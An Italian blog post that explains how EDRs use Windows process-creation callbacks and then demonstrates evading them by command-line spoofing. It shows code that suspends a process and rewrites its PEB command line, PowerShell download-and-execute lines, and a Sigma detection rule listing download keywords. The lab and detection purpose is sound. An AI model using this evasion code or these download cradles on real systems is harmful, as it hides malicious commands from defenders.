---
layout:     post
title:      "Notification Callback Routines e CommandLine tampering"
date:       2026-03-29 18:00:00 +0200
categories: [cyber-security, hacking, ita]
image:      /assets/images-posts/screenshot-2026-03-29-at-18.25.43.png
---
La questione *detection* si comincia a fare interessante a partire da questa funzionalità che - IMHO - fa sembrare il function hooking una modo "grezzo" di approcciare il problema. Ovviamente non è mia intenzione criticare metodi di detection che ci hanno aiutato per anni e continuano ad aiutarci, ma penso sia giusto segnalare il salto che c'è tra le due metodologie.

Va detto che le condizioni per consentire alle metodologie di detection di evolvere, con particolare riferimento alle **funzionalità estese** delle *notification callback routines*, sono state rese disponibili a partire da Windows Vista / Windows Server 2008 in avanti. Prima bisognava necessariamente arrangiarsi con quello che il sistema, che ricordiamo essere un OS chiuso, metteva a disposizione. Da questo punto di vista va riconosciuto a Microsoft di aver fatto - ad un certo punto della storia - la sua parte per rendere il sistema operativo più integrabile con componenti di terze parti.

EDIT: aggiungo il video di sintesi.

https://youtu.be/AUYyl9EJYsY

#### Come funziona la Notification Callback Routines

Come si intuisce dal nome della funzionalità, il sistema operativo può inviare una notifica ad un programma quando un determinato evento si verifica. Questa notifica non riguarda tutti gli eventi e non è inviata indiscriminatamente a tutti i programmi, è possibile per un software "registrarsi" affinché riceva determinate notifiche.

Nel mondo degli EDR significa che il software deve informare il sistema che desidera ricevere notifiche in merito ad eventi di sistema che, come accennato, riguardano una parte di ciò che può avvenire:

- Creazione/terminazione di un processo o di un thread
- Caricamento di immagini (DLL, EXE, driver) in un processo
- Operazioni sul registro
- Pre e post operazioni su handle

Gli EDR tipicamente utilizzano un Kernel Driver che all'avvio chiama l'API di registrazione e passa al Kernel il puntatore alla propria callback. Quindi potremmo dire che - banalizzando all'estremo - l'EDR si registra tra i software che vogliono ricevere una notifica in caso l'evento per i quale si sono registrati si verifichi. Se, come vedremo nella demo, l'EDR si registra per gli eventi legati alla creazione/terminazione di un processo il Kernel chiamerà la callback dell'EDR quando un nuovo processo viene creato o terminato.

È importante sottolineare che questa registrazione avviene a livello di kernel: la callback non è un normale programma in esecuzione, ma codice che gira nello strato più privilegiato del sistema operativo, ovvero in *kernel mode*. Questo è il motivo per cui gli EDR utilizzano un driver e non una semplice applicazione. Ora, a mio modo di vedere **per capire bene questo meccanismo bisogna metterci le mani ed impastare bene**, quindi **proviamo a scriverci il nostro driver per registrare la nostra callback**. Come avevo detto nel precedente articolo anche in questo caso mi baso sugli esempi utilizzati anche in famigerati testi di riferimento per queste tematiche, piegandoli un po' alle mie esigenze e semplificandoli per "abbassarli" al mio livello di conoscenza di C e della programmazione in ambiente Microsoft.

---

Per non aprire troppe parentesi in questo post in cui mi vorrei concentrare sul tema evasion, ho preparato un'approfondimento sul tema dei windows driver che [pubblicherò su Patreon](https://patreon.com/roccosicilia). Per chi è interessato a costruirsi dei lab "spinti" per lavorare con i concetti di raw-telemetri potrebbe essere un tema utile da approfondire assieme, personalmente sto trovando la tematica molto interessante ed utile alla comprensione profonda del funzionamento degli EDR.

---

Supponiamo di voler implementare una componente del nostro *personal EDR* e di voler essere notificati ogni volta che viene creato un nuovo processo, insieme agli eventuali parametri utilizzati. Il driver che stiamo sviluppando deve quindi registrare una callback tramite *PsSetCreateProcessNotifyRoutineEx()*, così da ricevere notifiche alla creazione dei processi. Questo rappresenta uno degli esempi classici riportati nel famigerato "Evading EDR".

<img src="{{ '/assets/images-posts/image-8.png' | relative_url }}" alt="image 8" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il codice è disponibile sulla mia repo [github](https://github.com/roccosicilia) e commentato nell'approfondimento su [Patreon](https://patreon.com/roccosicilia). Oltre al driver scriviamo un altro piccolo *programma* che fa anche un'altra cosa: dialoga direttamente con il driver che abbiamo creato per leggere le informazioni raccolte e scriverle in un comodo logfile così da avere un punto di controllo semplice da consultare (*main.c*).

Nel mio lab ho predisposto i sistemi per poter eseguire i test su Windows 10/11 - rif. compilazione e configurazione per i test nell'approfondimento - ed una volta caricato sulla guest di test (sistema operativo Windows 10) è possibile vederlo all'azione:

<img src="{{ '/assets/images-posts/image-9.png' | relative_url }}" alt="image 9" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Come previsto le informazioni relative ai processi vengono raccolte e, nel nostro caso, stampate in un logfile.

#### Visibilità lato EDR

Torniamo ai prodotti di mercato: come detto questa metodologia è utilizzata da molti EDR e ci permette di ottenere molte informazioni su ciò che accade a livello kernel. Nel lab che ho predisposto per i test possiamo affidarci ai sensori di Elastic per ottenere lo stesso risultato, ovviamente in modo molto più strutturato.

Ovviamente sapere quali processi vengono eseguiti (in questo post ci limitiamo al tema processi e nei prossimi esamineremo altri elementi) è abbastanza importante in quanto tutte le azioni che un bad actor farà potranno essere visibili sotto forma di processo con eventuali parametri. Un banale comando powershell richiede che venga avviato un processo, powershell appunto, a cui saranno passati dei parametri. Utilizzando la nostra configurazione in lab possiamo verificare il livello di visibilità di un agente come quello di Elastic così come fatto per il driver che ci siamo scritti da soli.

Facciamo fare qualcosa a powershell passando un comando qualsiasi:

<img src="{{ '/assets/images-posts/image-10.png' | relative_url }}" alt="image 10" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Su Elastic possiamo fare una query abbastanza precisa per intercettare questo evento registrato grazie al sensore dell'EDR:

```
# se l'evento avvia un processo nuovo
event.category : "process" and event.type : "start"
# se l'evento viende da un processo aperto
event.category : "process"
# per eventi powershell con un comando definito
event.category : "process" AND process.command_line : * AND process.executable : *powershell*
```

<img src="{{ '/assets/images-posts/image-11.png' | relative_url }}" alt="image 11" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Questo livello di dettaglio è estremamente utile in quanto permette ad EDR e SIEM di sapere esattamente cosa sta succedendo sul sistema, comprese le azioni del threat actor che, dopo aver ottenuto un primo accesso ad sistema, sfrutta powershell o altri componenti per impartire comandi localmente o l'esecuzione di un payload tramite Fake CAPTCHA ([ne ho parlato qui](https://roccosicilia.com/2026/02/17/analisi-di-un-c2-per-osx/)).

L'elemento fondamentale non è sapere che powershell è stato avviato da qualcuno in quanto si tratta di un'azione che di per se non possiamo considerare sospetta, la parte che ci interessa particolarmente è l'informazione in "***process.command_line***", ovvero le informazioni relative ai parametri che il kernel ci ha fornito. Sul contenuto di questo elemento possiamo fare dei ragionamenti più seri: conoscendo le tecniche usate dagli attaccanti possiamo creare delle regole in grado di intercettare comandi che riteniamo essere sospetti nonostante siano parte del command set disponibile per powershell, ma lo stesso ragionamento vale per qualsiasi CLI sistemando opportunamente la query.

#### Analisi dei processi e relativi parametri

Ora che abbiamo visto le basi della funzionalità consideriamone l’utilizzo per ottenere una detection utile.

Come detto su [Patreon](https://patreon.com/roccosicilia) pubblicherò un'approfondimento in merito alla scrittura del driver, in questo post ci limitiamo a considerare una parte del codice, quella in cui ci assicuriamo di gestire le informazioni sul processo inviateci dal kernel con particolare riferimento a ***CreateInfo->CommandLine*** (vedi sotto).

```
...
VOID ProcessCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    WCHAR logMessage[MAX_MESSAGE_LEN];
    UNREFERENCED_PARAMETER(Process);
    if (CreateInfo != NULL)
    {
        if (CreateInfo->ImageFileName != NULL)
        {
            if (CreateInfo->CommandLine != NULL)
            {
                _snwprintf_s(
                    logMessage,
                    MAX_MESSAGE_LEN,
                    _TRUNCATE,
                    L"[CREATO]    PID=%llu  PPID=%llu  Path=%ls  CmdLine=%ls\r\n",
                    (ULONG64)(ULONG_PTR)ProcessId,
                    (ULONG64)(ULONG_PTR)CreateInfo->ParentProcessId,
                    CreateInfo->ImageFileName->Buffer,
                    CreateInfo->CommandLine->Buffer);
            }
...
```

***CommandLine*** è una UNICODE_STRING che contiene la riga di comando completa eseguita sul sistema che stiamo osservando, ad esempio:

```
powershell.exe -ExecutionPolicy Bypass -c whoami
```

Si tratta dell'informazione che nel test andiamo poi a registrare nel log ed è anche il dato che abbiamo intercettato con Elastic come si può osservare nello screenshot poco sopra. Come detto è l'informazione su cui possiamo poi attivare determinate regole di detection: il fatto che qualcuno esegua un ***whoami*** o un ***whoami /priv*** di per sé non deve necessariamente essere considerato un comportamento sospetto, mentre se vediamo che l’utente tenta di eseguire comandi ottenuti come output da una richiesta HTTP GET, allora potremmo iniziare seriamente a porci qualche domanda.

> Molto spesso alcuni payload utilizzano questa sequenza per eseguire localmente codice scaricato da una fonte esterna senza la necessità di scriverlo su file e di conseguenza generare meno telemetria lato EDR.

```
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/sheliak/...").Content
```

I sistemi di detection che accedono a questa informazione ci permettono quindi di sviluppare delle fantastiche regole per intercettare queste azioni che riteniamo sospette. Ogni strumento ha modi diversi per definite queste regole e, approfitto dell'argomento per parlare di un altro concetto a mio parere ancora poco sfruttato, per descrivere un potenziale threat in un linguaggio comune si può utilizzare una struttura YAML nota con il nome di *sigma rule*.

```
title: PowerShell Download and Execute via Invoke-Expression
id: c4f5b2e3-9a1d-4f8b-bc7e-1d2a3f456789
status: experimental
description: >
  Detects PowerShell executing commands downloaded from a remote HTTP/HTTPS
  source using Invoke-Expression or encoded commands. Covers common patterns
  including IEX, Net.WebClient, and Base64 encoded payloads.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1105/
author: Rocco <sheliak> Sicilia
date: 2026/03/21
tags:
  - attack.execution
  - attack.t1059.001
  - attack.command_and_control
  - attack.t1105
logsource:
  product: windows
  category: process_creation
detection:
  selection_process:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_invoke_expression:
    CommandLine|contains:
      - 'Invoke-Expression'
      - 'IEX'
  selection_download:
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'iwr'
      - 'wget'
      - 'curl'
      - 'DownloadString'
      - 'DownloadFile'
      - 'Net.WebClient'
      - 'WebClient'
  selection_http:
    CommandLine|contains:
      - 'http://'
      - 'https://'
  selection_encoded:
    CommandLine|contains|windash:
      - '-enc '
      - '-encodedcommand '
      - '-ec '
  condition: >
    selection_process and (
      (selection_invoke_expression and selection_download and selection_http) or
      (selection_encoded and selection_http)
    )
falsepositives:
  - Administrative scripts that intentionally download and execute code
  - DevOps automation scripts
  - Software deployment tools (SCCM, Ansible)
level: high
```

Ora non voglio entrare nel tema threat intelligence e hunting in questo post, chi mi segue su [Patreon](https://patreon.com/roccosicilia) conosce già i miei progetti su questo fronte e c'è una sezione dedicata all'argomento, limitiamoci ad usare questa regola come esempio di detection per il nostro test e convertiamola in qualcosa che in nostro EDR è in grado di comprendere.

> Nota: nella repo di [HAPpy](https://github.com/roccosicilia/HAPpy) ho inserito una directory per le sigma rules che utilizzo in questi labs e non solo.

Esistono diversi tools per eseguire le conversioni per EDR e SIEM, per questi test suggerisco di buttare un occhio a [SOCprime](https://tdm.socprime.com/uncoder-ai/), come strumento online che mi sembra fatto bene, ed a sigma-cli come strumento da usare sul proprio sistema:

<img src="{{ '/assets/images-posts/image-12.png' | relative_url }}" alt="image 12" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

L'output della conversione della sigma rules lo possiamo usare sul nostro EDR / SIEM implementato nel lab: Elastic. Piccola nota tecnica: ho incontrato un po' di problemi con il converter ed ho dovuto ritoccare a mano al regole in quanto gli escape generavano degli errori, la regola nella repo è quella corretta "a mano" e [la trovate nella repo](https://github.com/roccosicilia/HAPpy/blob/main/sigmarules/windows/powershell_download_execute_iex.ndjson).

Di per se la regola è abbastanza semplice e punta ad analizzare il contenuto dei comandi passati in CLI (process.command_line in Elastic) e la detection scatta nel caso vi sia un match con le espressioni specificate nelle condizioni definite dalla regola. Ora possiamo far scattare la detection generando il comportamento che stiamo cercando:

```
powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/script.ps1')"
```

Nel caso di Elastic le regole di detection sono implementate per "girare" ogni cinque minuti (conf. di default) e possono prendere in considerazione l'intera base dati definendo correttamente il range di tempo.

<img src="{{ '/assets/images-posts/image-13.png' | relative_url }}" alt="image 13" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Le informazioni che ho messo a disposizione nel post vi consentiranno di replicare il test sulla vostra istanza Elastic ma se avete altri prodotti di detection potete usare la sigma rule condivisa per crearvi una query compatibile con il vostro prodotto.

Come spiegato in questo lungo paragrafo dovremmo aver capito che **quello che Elastic vede come contenuto del campo *process.command_line* è coerente con quello che il kernel ci fornisce con *CreateInfo->CommandLine*. Ne consegue che se fosse possibile modificare il contenuto dell'informazioni originale anche Elastic vedrebbe qualcosa di diverso**.

#### Command Line Tampering

Abbiamo visto come la callback routine relativa alla creazione del processo invia le informazioni relative ai parametri utilizzati all'agente dell'EDR (o al nostro test driver). Quando il processo viene creato le informazioni relative ai parametri vengono salvate nel campo *ProcessParameters* del *Process Environment Block*, per gli amici ***PEB***. Si tratta di una struttura che il kernel alloca per ogni processo in user-land e contiene informazioni critiche sul processo come il BeingDebugged (flag anti-debug), il puntatore alla lista dei moduli caricati (LDR) ed il citato ProcessParameters che di fatto è un puntatore a RTL_USER_PROCESS_PARAMETERS.

Quello che accade a basso livello lo si può osservare con WinDbg analizzando le informazioni presenti in memoria quando viene creato un processo, ad esempio un comando powershell con degli argomenti:

<img src="{{ '/assets/images-posts/image-15.png' | relative_url }}" alt="image 15" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Le informazioni come il contenuto di ImagePathName e CommandLine sono esattamente quelle che poi troviamo sul nostro Elastic di laboratorio. La cosa divertente di tutto questo è che **il PEB non risiede nell'area di memoria del kernel** ma nell'area di memoria dedicata alla user-land e potremmo quindi manipolare il dato.

Il trucco consiste nel sospendere il processo alla creazione passando come argomento qualcosa di lecito, modificare le informazioni relative agli argomenti che stiamo passando e solo successivamente far ripartire il processo con il nostro payload. In questo modo l’informazione passata alla *process creation callback* sarà quella falsa definita quando abbiamo sospeso il processo mentre il comando eseguito sarà quello modificato artificialmente.

In pratica potremmo ottenere l'esecuzione di un nostro comandi "malevolo", ad esempio un tipico payload passato via powershell ma alterare l'informazione con un comando lecito ed insospettabile:

```
# comando generico
powershell.exe -c Get-Date

# payload
powershell.exe -c "IEX (iwr http://127.0.0.1/script.ps1).Content"
```

Ovviamente tutto questo è verificabile in laboratorio con un po' di codice in C prendendo spunto da un esempio riportato in "Evading EDR" modificato per i nostri scopi ([sorgente disponibile qui](https://github.com/roccosicilia/HAPpy/blob/main/demo/ArgSpoof_CreateProc_bypass.c)):

<img src="{{ '/assets/images-posts/image-16.png' | relative_url }}" alt="image 16" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />
> Nota: Claude mi ha aiutato molto nella comprensione delle strutture che non conoscevo e nella chiarezza dei commenti per tirare fuori un codice che sia didatticamente utile.

Ci sono step che vale la pena approfondire a livello di codice. Il primo è la creazione del processo in stato sospeso in cui dichiariamo un comando powershell innocuo definito in ***char fakeCmdLine[]***:

```
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    // Command line deliberatamente falsa — visibile agli strumenti
    // di monitoraggio che leggono la command line al momento
    // della creazione del processo
    char fakeCmdLine[] =
        "powershell.exe -NoProfile -Command Get-Date";

    printf("[*] CreateProcess con command line FALSA:\n");
    printf("    %s\n\n", fakeCmdLine);

    BOOL result = CreateProcessA(
        NULL,
        fakeCmdLine,          // cmd line falsa nel PEB iniziale
        NULL,
        NULL,
        TRUE,                 // eredita gli handle (necessario per la pipe)
        CREATE_SUSPENDED |    // processo bloccato prima dell'esecuzione
        CREATE_NO_WINDOW,     // nessuna finestra console visibile
        NULL,
        NULL,
        &si,
        &pi
    );
```

Poi abbiamo l'analisi della memoria per ottenere le informazioni in merito al PEB:

```
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        0,           // ProcessBasicInformation
        &pbi,
        sizeof(pbi),
        &retLen
    );
    if (status != 0) {
        printf("NtQueryInformationProcess error\n");
        return 1;
    }
    printf("[OK] PEB address: %p\n", pbi.PebBaseAddress);
```

E sulla base di queste informazioni da cui poi deriviamo il puntatore a *ProcessParameters* possiamo modificare il comando con quello che vogliamo veramente eseguire:

```
    wchar_t realCmd[] =
        L"powershell.exe -NoProfile -Command whoami";
    SIZE_T size = (wcslen(realCmd) + 1) * sizeof(wchar_t);

    if (size > cmd.MaximumLength) {
        printf("Buffer troppo piccolo\n");
        return 1;
    }
    WriteProcessMemory(
        pi.hProcess,
        cmd.Buffer,    // indirizzo del buffer nel VA space del figlio
        realCmd,       // dati da scrivere (UTF-16)
        size,
        &bytesRead
    );
```

A questo punto possiamo compilare e vedere il programma all'opera. Per avere un riscontro immediato ho aggiunto al programma degli output in cui eseguo la print del comando in memoria nei vari momenti dell'esecuzione e chiudo con l'output del comando "malevolo" così da accertarci della corretta esecuzione del nostro codice.

#### Test in laboratorio

Ora abbiamo tutto quello che ci serve per *ingannare* il nostro EDR, o meglio, per passare informazioni errate all'EDR quando creiamo un processo con dei parametri che vogliamo nascondere.

Il lab che ho predisposto presenta diverse macchine su cui è attivo l'agent Elastic EDR che, come detto, utilizza le *Notification Callback Routines* per raccogliere informazioni sui processi mentre (rif. al [precedente blog post](https://roccosicilia.com/2026/03/09/detection-e-function-hooking/) su questi temi) non utilizza tecniche di Function Hooking.

Per osservare al meglio tutte le fase dell'evasion ho creato due piccoli programmi in C: il primo simula un comportamento senza evasion e si limita a creare un [processo powershell con un argomento](https://github.com/roccosicilia/HAPpy/blob/main/demo/ArgSpoof_CreateProc_normal.c), il secondo è il [già citato programma](https://github.com/roccosicilia/HAPpy/blob/main/demo/ArgSpoof_CreateProc_bypass.c) con cui creiamo un processo che mettiamo subito in stato sospeso e solo dopo averne modificato gli argomenti lo andiamo ad eseguire. Per una questione di trasparenza non vi condivido i binary, la compilazione è comunque molto semplice e potete utilizzare MinGW:

```
x86_64-w64-mingw32-gcc ArgSpoof_CreateProc_bypass.c -o ArgSpoof_CreateProc_bypass.exe
```

Possiamo quindi eseguire il "non-payload" per verificare il corretto comportamento dell'agent.

<img src="{{ '/assets/images-posts/image-17.png' | relative_url }}" alt="image 17" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il processo powershell che viene invocato ha come parametro *whoami* ed l'output è coerente con l'argomento. Lato EDR possiamo verificare cose è stato osservato.

<img src="{{ '/assets/images-posts/screenshot-2026-03-29-at-17.56.03.png' | relative_url }}" alt="screenshot 2026 03 29 at 17.56.03" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

La telemetria mostra correttamente in *process.command_line* gli argomenti che abbiamo effettivamente passato a powershell. Ora possiamo eseguire il programma che implementa il comportamento discusso nel precedente paragrafo.

<img src="{{ '/assets/images-posts/image-19.png' | relative_url }}" alt="image 19" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Come avevo detto questo programma ha un po' più output ed esegua anche la print delle aree di memoria interessate alla modifica. Anche in questo caso l'output è coerente con l'argomento *whoami*, ma vediamo cosa ha registrato l'EDR.

<img src="{{ '/assets/images-posts/screenshot-2026-03-29-at-17.57.19.png' | relative_url }}" alt="screenshot 2026 03 29 at 17.57.19" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Ed ecco la magia, questa volta process.command_line riporta come argomento il comando *Get-Date*, ovvero quello che abbiamo utilizzato come falso comando per evitare che l'EDR veda il vero comando che abbiamo utilizzato.

#### Conclusioni

Mi sono dilungato in questo post di introduzione al tema Callback Routines per mettere le basi al funzionamento di questa funzionalità e poi continuare nei prossimi post ad abusare di questo meccanismo. Questo lab permette di mettere le mani sul PEB e ci/mi permette di familiarizzare con le funzioni delle librerie di Windows (come ho già detto non sono un programmatore di professione), tutti temi che sono utili anche ai prossimi laboratori.

L'utilità di questa tecnica di evasione è abbastanza chiara: se lato EDR e SIEM implemento detection rules che si basano sulla disponibilità degli argomenti che passo ai processo, alterare questo dato invalida l'efficacia delle regole. È un elemento da non sottovalutare se si vuole predisporre una difesa funzionante.

Prossimo argomento: PPID spoofing.
